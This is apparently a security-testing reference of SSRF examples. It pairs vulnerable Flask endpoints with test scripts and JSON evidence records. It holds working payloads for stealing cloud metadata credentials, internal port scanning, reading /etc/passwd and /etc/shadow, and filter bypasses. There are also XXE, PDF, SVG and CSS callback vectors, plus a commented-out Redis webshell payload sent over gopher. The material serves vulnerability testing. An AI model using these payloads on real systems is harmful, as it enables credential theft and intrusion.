# SSRF Testing Examples

This file contains comprehensive examples of SSRF vulnerability testing, organized by attack category.

## Table of Contents
1. [Basic SSRF - Localhost Access](#basic-ssrf---localhost-access)
2. [Cloud Metadata SSRF](#cloud-metadata-ssrf)
3. [Filter Bypass Techniques](#filter-bypass-techniques)
4. [Protocol Smuggling](#protocol-smuggling)
5. [Blind SSRF](#blind-ssrf)
6. [Test Result Types](#test-result-types)
7. [XXE-based SSRF](#xxe-based-ssrf)
8. [PDF/HTML Renderer SSRF](#pdfhtml-renderer-ssrf)
9. [SVG/Image Processing SSRF](#svgimage-processing-ssrf)
10. [Advanced Bypass Examples](#advanced-bypass-examples)

---

## Basic SSRF - Localhost Access

### Example 1: Direct Localhost Access

**Scenario**: URL fetcher endpoint without proper validation

**Vulnerability**:
```python
# api/fetch.py - VULNERABLE
@app.route('/api/fetch', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    response = requests.get(url)  # No validation!
    return response.text
```

**Test**:
```python
# Baseline: external URL
POST /api/fetch {"url": "http://example.com"} → 200 OK

# Test: localhost
POST /api/fetch {"url": "http://127.0.0.1"} → 200 OK with internal content
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "localhost",
  "baseline": {
    "url": "http://example.com",
    "status": 200,
    "response_snippet": "<!DOCTYPE html>..."
  },
  "test": {
    "url": "http://127.0.0.1",
    "status": 200,
    "response_snippet": "<html>Internal Admin Panel</html>",
    "response_hash": "sha256:abc123..."
  },
  "evidence": "Server fetched localhost, exposing internal admin panel"
}
```

---

### Example 2: Internal Port Scanning

**Scenario**: SSRF used to enumerate internal services

**Test**:
```python
# Scan common internal ports
ports = [22, 80, 443, 3306, 5432, 6379, 8080, 27017]

for port in ports:
    url = f"http://127.0.0.1:{port}"
    start = time.time()
    response = requests.post(f"{target}/api/fetch", json={"url": url})
    elapsed = time.time() - start
    
    # Different response times/errors indicate port status
    print(f"Port {port}: {response.status_code} ({elapsed:.2f}s)")
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "port_scan",
  "test": {
    "scan_results": [
      {"port": 22, "status": "timeout", "time": 5.02},
      {"port": 80, "status": 200, "time": 0.15},
      {"port": 6379, "status": 200, "time": 0.12, "content": "redis_version:6.2.6"}
    ]
  },
  "evidence": "Internal port scan revealed HTTP (80) and Redis (6379) services"
}
```

---

## Cloud Metadata SSRF

### Example 3: AWS Metadata - IMDSv1

**Scenario**: SSRF to AWS EC2 metadata endpoint

**Test**:
```python
# AWS IMDSv1 (no token required)
payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data"
]

response = requests.post(f"{target}/api/fetch", 
    json={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})

# Response contains role name
role_name = response.text.strip()

# Fetch credentials
creds_response = requests.post(f"{target}/api/fetch",
    json={"url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "cloud_metadata",
  "cloud_provider": "aws",
  "test": {
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-ssrf-role",
    "status": 200,
    "response_snippet": "{\"Code\": \"Success\", \"AccessKeyId\": \"[REDACTED]\", \"SecretAccessKey\": \"[REDACTED]\", \"Token\": \"[REDACTED]\", \"Expiration\": \"2024-01-15T12:00:00Z\"}",
    "response_hash": "sha256:def456..."
  },
  "evidence": "AWS IAM credentials for role 'ec2-ssrf-role' exposed via SSRF"
}
```

---

### Example 4: GCP Metadata

**Scenario**: SSRF to Google Cloud metadata (requires header)

**Note**: GCP metadata requires `Metadata-Flavor: Google` header. Standard SSRF may not work unless app forwards headers.

**Test**:
```python
# GCP v1beta1 (no header required - deprecated but may work)
response = requests.post(f"{target}/api/fetch",
    json={"url": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"})

# If header forwarding is possible via gopher://
gopher_payload = "gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0D%0AHost:%20metadata.google.internal%0D%0AMetadata-Flavor:%20Google%0D%0A%0D%0A"
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "cloud_metadata",
  "cloud_provider": "gcp",
  "test": {
    "url": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
    "status": 200,
    "response_snippet": "{\"access_token\": \"[REDACTED]\", \"expires_in\": 3600, \"token_type\": \"Bearer\"}"
  },
  "evidence": "GCP service account token exposed via v1beta1 metadata endpoint"
}
```

---

### Example 5: Azure Metadata

**Scenario**: SSRF to Azure IMDS

**Test**:
```python
# Azure requires Metadata: true header
# Standard SSRF may fail unless header is forwarded
response = requests.post(f"{target}/api/fetch",
    json={"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "cloud_metadata",
  "cloud_provider": "azure",
  "test": {
    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "status": 200,
    "response_snippet": "{\"compute\": {\"subscriptionId\": \"[REDACTED]\", \"resourceGroupName\": \"[REDACTED]\"}}"
  },
  "evidence": "Azure instance metadata exposed including subscription details"
}
```

---

## Filter Bypass Techniques

### Example 6: IP Encoding Bypass

**Scenario**: Application blocks "127.0.0.1" and "localhost" but doesn't normalize IPs

**Test**:
```python
# Encoded representations of 127.0.0.1
bypass_payloads = [
    ("decimal", "http://2130706433"),
    ("hex", "http://0x7f000001"),
    ("octal", "http://0177.0.0.1"),
    ("short", "http://127.1"),
    ("ipv6_mapped", "http://[::ffff:127.0.0.1]"),
]

for name, payload in bypass_payloads:
    response = requests.post(f"{target}/api/fetch", json={"url": payload})
    if response.status_code == 200 and "internal" in response.text.lower():
        print(f"Bypass successful: {name}")
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "filter_bypass",
  "bypass_technique": "decimal_ip",
  "test": {
    "url": "http://2130706433",
    "resolved_to": "127.0.0.1",
    "status": 200,
    "response_snippet": "<html>Internal Dashboard</html>"
  },
  "evidence": "Filter bypassed using decimal IP encoding (2130706433 = 127.0.0.1)"
}
```

---

### Example 7: DNS Rebinding Bypass

**Scenario**: Application validates DNS on first resolution but uses cached result

**Test**:
```python
# Using 1u.ms DNS rebinding service
# First lookup: external IP, Second lookup: 127.0.0.1
rebind_domain = "make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms"

response = requests.post(f"{target}/api/fetch", 
    json={"url": f"http://{rebind_domain}/"})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "filter_bypass",
  "bypass_technique": "dns_rebinding",
  "test": {
    "url": "http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/",
    "dns_first_lookup": "1.2.3.4",
    "dns_second_lookup": "127.0.0.1",
    "status": 200,
    "response_snippet": "<html>Internal Service</html>"
  },
  "evidence": "DNS rebinding bypassed validation (1.2.3.4 → 127.0.0.1)"
}
```

---

### Example 8: URL Parser Confusion

**Scenario**: Different parsing between validator and HTTP library

**Test**:
```python
# URL parser confusion payloads
confusion_payloads = [
    "http://attacker.com@127.0.0.1/",           # userinfo confusion
    "http://127.0.0.1#@attacker.com/",          # fragment confusion
    "http://127.0.0.1:80\\@attacker.com/",      # backslash confusion
    "http://attacker.com:80#@127.0.0.1:80/",    # port + fragment
]

for payload in confusion_payloads:
    response = requests.post(f"{target}/api/fetch", json={"url": payload})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "filter_bypass",
  "bypass_technique": "url_parser_confusion",
  "test": {
    "url": "http://attacker.com@127.0.0.1/admin",
    "validator_saw": "attacker.com",
    "http_library_fetched": "127.0.0.1",
    "status": 200,
    "response_snippet": "<html>Admin Panel</html>"
  },
  "evidence": "URL parser confusion: validator saw attacker.com, requests fetched 127.0.0.1"
}
```

---

### Example 9: Redirect-Based Bypass

**Scenario**: Application allows external URLs, follows redirects to internal

**Test**:
```python
# Using r3dir.me redirect service
redirect_payloads = [
    "https://307.r3dir.me/--to/?url=http://127.0.0.1/",
    "https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/",
]

for payload in redirect_payloads:
    response = requests.post(f"{target}/api/fetch", json={"url": payload})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "filter_bypass",
  "bypass_technique": "open_redirect",
  "test": {
    "url": "https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/",
    "redirect_chain": ["307.r3dir.me → 169.254.169.254"],
    "status": 200,
    "response_snippet": "ami-id\ninstance-id\n..."
  },
  "evidence": "Redirect bypass via 307.r3dir.me to AWS metadata"
}
```

---

## Protocol Smuggling

### Example 10: file:// Protocol - Local File Read

**Scenario**: Application accepts file:// URLs

**Test**:
```python
file_payloads = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///c:/windows/win.ini",
]

response = requests.post(f"{target}/api/fetch", 
    json={"url": "file:///etc/passwd"})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "protocol_smuggling",
  "protocol": "file",
  "test": {
    "url": "file:///etc/passwd",
    "status": 200,
    "response_snippet": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...",
    "response_hash": "sha256:xyz789..."
  },
  "evidence": "Local file read via file:// protocol - /etc/passwd exposed"
}
```

---

### Example 11: gopher:// Protocol - Redis Attack

**Scenario**: Gopher protocol enabled, Redis accessible on localhost

**Test**:
```python
# INFO command (safe reconnaissance)
gopher_info = "gopher://127.0.0.1:6379/_INFO%0D%0A"

# DANGEROUS: Webshell via Redis (DO NOT USE without authorization)
# gopher_shell = "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3F%3E%22%0D%0ASAVE%0D%0A"

response = requests.post(f"{target}/api/fetch", json={"url": gopher_info})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "protocol_smuggling",
  "protocol": "gopher",
  "internal_service": "redis",
  "test": {
    "url": "gopher://127.0.0.1:6379/_INFO%0D%0A",
    "status": 200,
    "response_snippet": "# Server\nredis_version:6.2.6\nredis_git_sha1:00000000\n..."
  },
  "evidence": "Redis (6.2.6) accessible via gopher:// protocol - potential RCE vector"
}
```

---

### Example 12: dict:// Protocol - Service Detection

**Scenario**: Dict protocol enabled for port/service scanning

**Test**:
```python
dict_payloads = [
    "dict://127.0.0.1:6379/INFO",    # Redis
    "dict://127.0.0.1:11211/stats",  # Memcached
]

response = requests.post(f"{target}/api/fetch", 
    json={"url": "dict://127.0.0.1:6379/INFO"})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "protocol_smuggling",
  "protocol": "dict",
  "test": {
    "url": "dict://127.0.0.1:6379/INFO",
    "status": 200,
    "response_snippet": "redis_version:6.2.6"
  },
  "evidence": "Redis detected via dict:// protocol enumeration"
}
```

---

## Blind SSRF

### Example 13: OOB Callback Detection

**Scenario**: Response not returned but server makes outbound request

**Test**:
```python
# Using Burp Collaborator or interact.sh
oob_domain = "xyz123.oastify.com"

payloads = [
    f"http://{oob_domain}/ssrf",
    f"http://internal.{oob_domain}/",
]

for payload in payloads:
    requests.post(f"{target}/api/webhook", json={"callback_url": payload})

# Check collaborator/interact.sh for callbacks
# HTTP request received from target IP → VALIDATED
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "blind_ssrf",
  "detection_method": "oob_callback",
  "test": {
    "url": "http://xyz123.oastify.com/ssrf",
    "endpoint": "/api/webhook"
  },
  "oob_evidence": {
    "callback_received": true,
    "source_ip": "10.0.0.50",
    "timestamp": "2024-01-15T10:30:00Z",
    "request_type": "HTTP"
  },
  "evidence": "Blind SSRF confirmed - OOB callback received from target server (10.0.0.50)"
}
```

---

### Example 14: DNS-Only Callback

**Scenario**: HTTP blocked but DNS resolution occurs

**Test**:
```python
# If HTTP callback blocked, try DNS-only detection
dns_payload = f"http://ssrf-test.{oob_domain}/"

requests.post(f"{target}/api/fetch", json={"url": dns_payload})

# Check for DNS query to ssrf-test.xyz123.oastify.com
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "blind_ssrf",
  "detection_method": "dns_callback",
  "test": {
    "url": "http://ssrf-test.xyz123.oastify.com/"
  },
  "oob_evidence": {
    "dns_query_received": true,
    "queried_domain": "ssrf-test.xyz123.oastify.com",
    "source_ip": "10.0.0.50"
  },
  "evidence": "Blind SSRF confirmed via DNS resolution (HTTP may be blocked)"
}
```

---

## Test Result Types

### Example 15: FALSE_POSITIVE - Properly Blocked

**Scenario**: Application correctly validates and blocks internal URLs

**Test**:
```python
response = requests.post(f"{target}/api/fetch", 
    json={"url": "http://127.0.0.1/"})

# Response: 400 Bad Request - "Invalid URL: internal addresses not allowed"
```

**Evidence**:
```json
{
  "status": "FALSE_POSITIVE",
  "ssrf_type": "localhost",
  "test": {
    "url": "http://127.0.0.1/",
    "status": 400,
    "response_snippet": "{\"error\": \"Invalid URL: internal addresses not allowed\"}"
  },
  "bypasses_attempted": ["decimal_ip", "hex_ip", "ipv6", "dns_rebinding"],
  "bypasses_successful": [],
  "evidence": "All internal URL requests properly blocked including bypass attempts"
}
```

---

### Example 16: PARTIAL - Ambiguous Result

**Scenario**: Different response but no clear content leak

**Test**:
```python
# External URL
external = requests.post(f"{target}/api/fetch", json={"url": "http://example.com"})
# Response: 200 OK, content: "<!DOCTYPE html>..."

# Internal URL
internal = requests.post(f"{target}/api/fetch", json={"url": "http://127.0.0.1"})
# Response: 200 OK, content: "" (empty)
```

**Evidence**:
```json
{
  "status": "PARTIAL",
  "ssrf_type": "localhost",
  "test": {
    "url": "http://127.0.0.1/",
    "status": 200,
    "response_snippet": "",
    "note": "Empty response differs from external URL (which returns content)"
  },
  "evidence": "Possible SSRF - internal URL returns empty 200 OK (different from external). Manual verification needed."
}
```

---

### Example 17: UNVALIDATED - Test Incomplete

**Scenario**: Testing could not be completed

**Evidence**:
```json
{
  "status": "UNVALIDATED",
  "ssrf_type": "cloud_metadata",
  "reason": "timeout",
  "test": {
    "url": "http://169.254.169.254/latest/meta-data/",
    "error": "Connection timed out after 30s"
  },
  "evidence": "SSRF test incomplete - request to metadata endpoint timed out. May indicate network filtering or non-AWS environment."
}
```

---

## XXE-based SSRF

### Example 18: XXE to Cloud Metadata

**Scenario**: XML parser with external entities enabled

**Vulnerability**:
```python
# api/parse.py - VULNERABLE
@app.route('/api/parse', methods=['POST'])
def parse_xml():
    xml_data = request.data
    tree = etree.fromstring(xml_data)  # XXE enabled!
    return etree.tostring(tree)
```

**Test**:
```python
xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>'''

response = requests.post(f"{target}/api/parse", 
    data=xxe_payload, 
    headers={"Content-Type": "application/xml"})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "xxe_ssrf",
  "test": {
    "payload_type": "xxe",
    "url": "http://169.254.169.254/latest/meta-data/",
    "status": 200,
    "response_snippet": "<data>ami-id\ninstance-id\nhostname\n...</data>"
  },
  "evidence": "XXE-based SSRF to AWS metadata - internal data exfiltrated via XML entity"
}
```

---

## PDF/HTML Renderer SSRF

### Example 19: wkhtmltopdf SSRF

**Scenario**: HTML-to-PDF converter fetches embedded resources

**Vulnerability**:
```python
# api/pdf.py - VULNERABLE
@app.route('/api/generate-pdf', methods=['POST'])
def generate_pdf():
    html_content = request.json.get('html')
    pdf = pdfkit.from_string(html_content, False)  # Fetches embedded URLs!
    return send_file(io.BytesIO(pdf), mimetype='application/pdf')
```

**Test**:
```python
html_payload = '''
<html>
<body>
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="800" height="600"></iframe>
</body>
</html>
'''

response = requests.post(f"{target}/api/generate-pdf", json={"html": html_payload})
# PDF contains rendered AWS metadata
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "pdf_ssrf",
  "injection_vector": "iframe",
  "test": {
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "status": 200,
    "note": "AWS credentials visible in generated PDF"
  },
  "evidence": "SSRF via PDF generator - iframe fetched AWS IAM credentials rendered in PDF output"
}
```

### Example 20: CSS-based SSRF in PDF

**Scenario**: PDF generator processes CSS with url() functions

**Test**:
```python
html_payload = '''
<html>
<style>
@import url("http://169.254.169.254/latest/meta-data/");
body { background: url("http://ATTACKER.oastify.com/css-ssrf"); }
</style>
<body>Test</body>
</html>
'''
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "pdf_ssrf",
  "injection_vector": "css_import",
  "test": {
    "url": "http://ATTACKER.oastify.com/css-ssrf"
  },
  "oob_evidence": {
    "callback_received": true,
    "source_ip": "10.0.0.50"
  },
  "evidence": "Blind SSRF via CSS @import in PDF generator - OOB callback received"
}
```

---

## SVG/Image Processing SSRF

### Example 21: SVG Image SSRF

**Scenario**: Image processor handles SVG with external references

**Test**:
```python
svg_payload = '''<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>'''

response = requests.post(f"{target}/api/upload-image",
    files={"image": ("test.svg", svg_payload, "image/svg+xml")})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "svg_ssrf",
  "test": {
    "payload": "SVG with xlink:href to metadata endpoint",
    "url": "http://169.254.169.254/latest/meta-data/",
    "status": 200
  },
  "evidence": "SSRF via SVG image processing - external URL fetched during image handling"
}
```

---

## Advanced Bypass Examples

### Example 22: Unicode Bypass

**Scenario**: Filter blocks "localhost" but doesn't normalize Unicode

**Test**:
```python
unicode_payloads = [
    "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",        # Enclosed alphanumerics
    "http://127。0。0。1",         # Fullwidth dots
    "http://ʟᴏᴄᴀʟʜᴏꜱᴛ",          # Small caps
]
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "filter_bypass",
  "bypass_technique": "unicode_normalization",
  "test": {
    "url": "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
    "normalized_to": "localhost",
    "status": 200,
    "response_snippet": "<html>Internal Service</html>"
  },
  "evidence": "Unicode bypass: ⓛⓞⓒⓐⓛⓗⓞⓢⓣ normalized to localhost"
}
```

### Example 23: CRLF Injection Bypass

**Scenario**: Inject headers via CRLF in URL

**Test**:
```python
crlf_payload = "http://allowed.com%0d%0aHost:%20127.0.0.1%0d%0a"

response = requests.post(f"{target}/api/fetch", json={"url": crlf_payload})
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "ssrf_type": "filter_bypass",
  "bypass_technique": "crlf_injection",
  "test": {
    "url": "http://allowed.com%0d%0aHost:%20127.0.0.1",
    "injected_header": "Host: 127.0.0.1",
    "status": 200
  },
  "evidence": "CRLF injection bypassed host validation - injected Host header"
}
```

---

## Common Injection Points Reference

| Feature | Parameter Names | Example Payload |
|---------|----------------|-----------------|
| URL Fetcher | `url`, `uri`, `path`, `src` | `?url=http://127.0.0.1` |
| Webhook | `callback`, `webhook_url`, `notify` | `{"callback": "http://127.0.0.1"}` |
| File Import | `import_url`, `file_url`, `document` | `?import_url=file:///etc/passwd` |
| Image/Avatar | `avatar_url`, `image_url`, `picture` | `?avatar_url=http://169.254.169.254/` |
| PDF Generator | `html_url`, `source`, `template` | `<img src="http://127.0.0.1">` |
| OAuth | `redirect_uri`, `callback_uri` | Redirect to internal |
| Proxy | `proxy_url`, `forward_to` | `?proxy_url=http://127.0.0.1` |

